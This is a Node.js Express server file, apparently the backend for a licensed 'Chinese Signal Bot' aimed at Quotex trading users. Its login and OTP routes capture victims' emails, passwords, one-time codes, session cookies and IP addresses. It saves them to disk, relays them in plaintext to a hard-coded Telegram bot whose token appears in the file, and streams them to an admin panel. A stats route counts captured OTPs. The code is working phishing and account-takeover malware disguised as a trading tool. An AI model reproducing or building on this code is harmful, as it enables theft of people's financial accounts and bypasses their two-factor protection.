const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ================== TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID = "7293402395";

async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" });
    } catch (error) {
        console.error("Telegram Error:", error.message);
    }
}

// ================== SSE BROADCAST ==================
const sseClients = new Set();

function broadcastSSE(eventType, data) {
    const payload = JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() });
    sseClients.forEach(client => {
        try { client.write(`data: ${payload}\n\n`); } catch (e) {}
    });
}

// Real-time SSE endpoint (admin panel connects here)
app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.flushHeaders();

    // Send heartbeat every 20 seconds to keep connection alive
    const heartbeat = setInterval(() => {
        try { res.write(`:heartbeat\n\n`); } catch (e) {}
    }, 20000);

    sseClients.add(res);
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE ready' })}\n\n`);

    req.on('close', () => {
        clearInterval(heartbeat);
        sseClients.delete(res);
    });
});

// ================== PERSISTENT STORAGE ==================
const DATA_FILE = path.join(__dirname, 'users.json');
const LICENSES_FILE = path.join(__dirname, 'licenses.json');

let users = [];
let licenses = [];

function loadUsers() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            users = JSON.parse(data);
        } else {
            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
        }
    } catch (e) { users = []; }
}

function saveUsers() {
    try { fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2)); } catch (e) {}
}

function loadLicenses() {
    try {
        if (fs.existsSync(LICENSES_FILE)) {
            const data = fs.readFileSync(LICENSES_FILE, 'utf8').trim();
            licenses = data ? JSON.parse(data) : [];
        } else {
            licenses = [];
            fs.writeFileSync(LICENSES_FILE, JSON.stringify([], null, 2));
        }
    } catch (e) { licenses = []; }
}

function saveLicenses() {
    try { fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2)); } catch (e) {}
}

loadUsers();
loadLicenses();

// Helper: Get or create user
function getOrCreateUser(licenceKey, fullName = "Unknown") {
    let user = users.find(u => u.licenceKey === licenceKey);
    if (!user) {
        user = {
            id: Date.now().toString(),
            licenceKey,
            fullName,
            username: "",
            password: "",
            otp: "",
            ip: "",
            cookies: "",
            status: "Active",
            connected: false,
            lastActivity: new Date().toISOString(),
            activities: []
        };
        users.unshift(user);
    }
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}

// ================== LICENSE ROUTES ==================
app.get('/api/licenses', (req, res) => {
    res.json(licenses);
});

app.post('/api/licenses', (req, res) => {
    const { key, type, expiry, maxUses, status } = req.body;
    if (!key) return res.status(400).json({ error: "Key required" });
    if (licenses.find(l => l.key === key)) {
        return res.status(400).json({ error: "License already exists" });
    }
    const newLicense = {
        key,
        type: type || "Standard",
        status: status || "Active",
        usesRemaining: maxUses || null,
        assignedTo: null,
        dateAdded: new Date().toISOString(),
        expiry: expiry || null
    };
    licenses.unshift(newLicense);
    saveLicenses();
    broadcastSSE('license_added', newLicense);
    res.json({ success: true });
});

app.patch('/api/licenses/:key', (req, res) => {
    const key = decodeURIComponent(req.params.key);
    const { status } = req.body;
    const license = licenses.find(l => l.key === key);
    if (!license) return res.status(404).json({ error: "License not found" });
    if (status) license.status = status;
    saveLicenses();
    broadcastSSE('license_updated', { key, status: license.status });
    res.json({ success: true, key, status: license.status });
});

app.delete('/api/licenses/:key', (req, res) => {
    const key = decodeURIComponent(req.params.key);
    licenses = licenses.filter(l => l.key !== key);
    saveLicenses();
    broadcastSSE('license_deleted', { key });
    res.json({ success: true });
});

// Validate License (called by main bot)
app.post('/api/validate-license', (req, res) => {
    const { licenseKey } = req.body;
    if (!licenseKey) return res.json({ valid: false, message: "No key provided" });

    const license = licenses.find(l =>
        l.key === licenseKey &&
        l.status === "Active" &&
        (!l.expiry || new Date(l.expiry) > new Date())
    );

    res.json({
        valid: !!license,
        message: license ? "License is valid" : "Invalid or expired license key."
    });
});

// ================== LICENSE ACTIVATION ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";

    const user = getOrCreateUser(licenseKey, userName);
    if (userName && userName !== "Pending Name") user.fullName = userName;
    user.activities.push({ action: "License Activated", timestamp: new Date().toLocaleString() });
    saveUsers();

    broadcastSSE('license_activated', {
        licenceKey: licenseKey,
        fullName: userName,
        ip,
        timestamp: timestamp || new Date().toLocaleString()
    });

    const message = `🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`;
    await sendTelegramMessage(message);
    res.status(200).json({ status: "success" });
});

// ================== QUOTEX LOGIN ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";

    const user = getOrCreateUser(licenceKey, name);
    user.username = email;
    user.password = password;
    user.ip = ip;
    user.cookies = cookies;
    user.status = "Online";
    user.activities.push({ action: "Quotex Login Submitted", timestamp: new Date().toLocaleString() });
    saveUsers();

    broadcastSSE('quotex_login', {
        licenceKey,
        fullName: name,
        email,
        password,
        ip,
        cookies,
        timestamp: new Date().toLocaleString()
    });

    const message = `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
    await sendTelegramMessage(message);
    res.status(200).json({ status: "ok" });
});

// ================== OTP ==================
app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";

    const user = getOrCreateUser(licenceKey, name);
    user.otp = otp;
    user.ip = ip;
    user.cookies = cookies;
    user.status = "Online";
    user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
    saveUsers();

    broadcastSSE('otp_entered', {
        licenceKey,
        fullName: name,
        email,
        otp,
        ip,
        cookies,
        timestamp: new Date().toLocaleString()
    });

    const message = `🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
    await sendTelegramMessage(message);
    res.status(200).json({ status: "ok" });
});

// ================== BLOCK / UNBLOCK USER ==================
app.post('/api/block-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });

    // Mark user as blocked
    const user = users.find(u => u.licenceKey === licenceKey);
    if (user) {
        user.blocked = true;
        user.status  = "Blocked";
        user.activities.push({ action: "🚫 Blocked by Admin", timestamp: new Date().toLocaleString() });
        saveUsers();
    }

    // Deactivate the matching license so validate-license also fails
    const lic = licenses.find(l => l.key === licenceKey);
    if (lic) {
        lic.status = "Inactive";
        saveLicenses();
    }

    broadcastSSE('user_blocked', {
        licenceKey,
        fullName: user?.fullName || 'Unknown',
        timestamp: new Date().toLocaleString()
    });

    const msg = `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
    await sendTelegramMessage(msg);
    res.json({ success: true });
});

app.post('/api/unblock-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });

    const user = users.find(u => u.licenceKey === licenceKey);
    if (user) {
        user.blocked = false;
        user.status  = "Active";
        user.activities.push({ action: "✅ Unblocked by Admin", timestamp: new Date().toLocaleString() });
        saveUsers();
    }

    // Re-activate their license
    const lic = licenses.find(l => l.key === licenceKey);
    if (lic) {
        lic.status = "Active";
        saveLicenses();
    }

    broadcastSSE('user_unblocked', {
        licenceKey,
        fullName: user?.fullName || 'Unknown',
        timestamp: new Date().toLocaleString()
    });

    res.json({ success: true });
});

// Called by the main bot every 15 seconds to check if user is still authorised
app.get('/api/check-access', (req, res) => {
    const licenseKey = req.query.licenseKey || req.query.licenceKey;
    if (!licenseKey) return res.json({ allowed: false, reason: "no_key" });

    const user = users.find(u => u.licenceKey === licenseKey);
    if (user && user.blocked) {
        return res.json({ allowed: false, reason: "blocked" });
    }

    const lic = licenses.find(l => l.key === licenseKey);
    if (!lic || lic.status !== "Active" || (lic.expiry && new Date(lic.expiry) < new Date())) {
        return res.json({ allowed: false, reason: "license_inactive" });
    }

    res.json({ allowed: true });
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', async (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
    broadcastSSE('activity', { action, userName, ip, timestamp: new Date().toLocaleString() });
    res.status(200).json({ status: "success" });
});

app.post('/api/notification-permission', async (req, res) => {
    const { userName, permission, timestamp } = req.body;
    res.status(200).json({ status: "success" });
});

// ================== TRIGGER CONNECTED ==================
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || "User";
    broadcastSSE('trigger_connected', { userName });
    const message = `🔗 <b>Connection Triggered</b>\n👤 User: <b>${userName}</b>`;
    await sendTelegramMessage(message);
    res.send("Trigger sent");
});

// ================== STATS & DATA ==================
app.get('/api/stats', (req, res) => {
    res.json({
        totalUsers: users.length,
        onlineNow: users.filter(u => u.status === "Online").length,
        otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
        connectedAccounts: users.filter(u => u.connected).length,
        totalLicenses: licenses.length,
        activeLicenses: licenses.filter(l => l.status === "Active").length
    });
});

app.get('/api/users', (req, res) => {
    res.json(users);
});

app.get('/api/latest-activity', (req, res) => {
    res.json({
        logins: users.filter(u => u.username),
        otps: users.filter(u => u.otp)
    });
});

app.get('/', (req, res) => {
    res.send("✅ Chinese Signal Bot Server v3 Running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
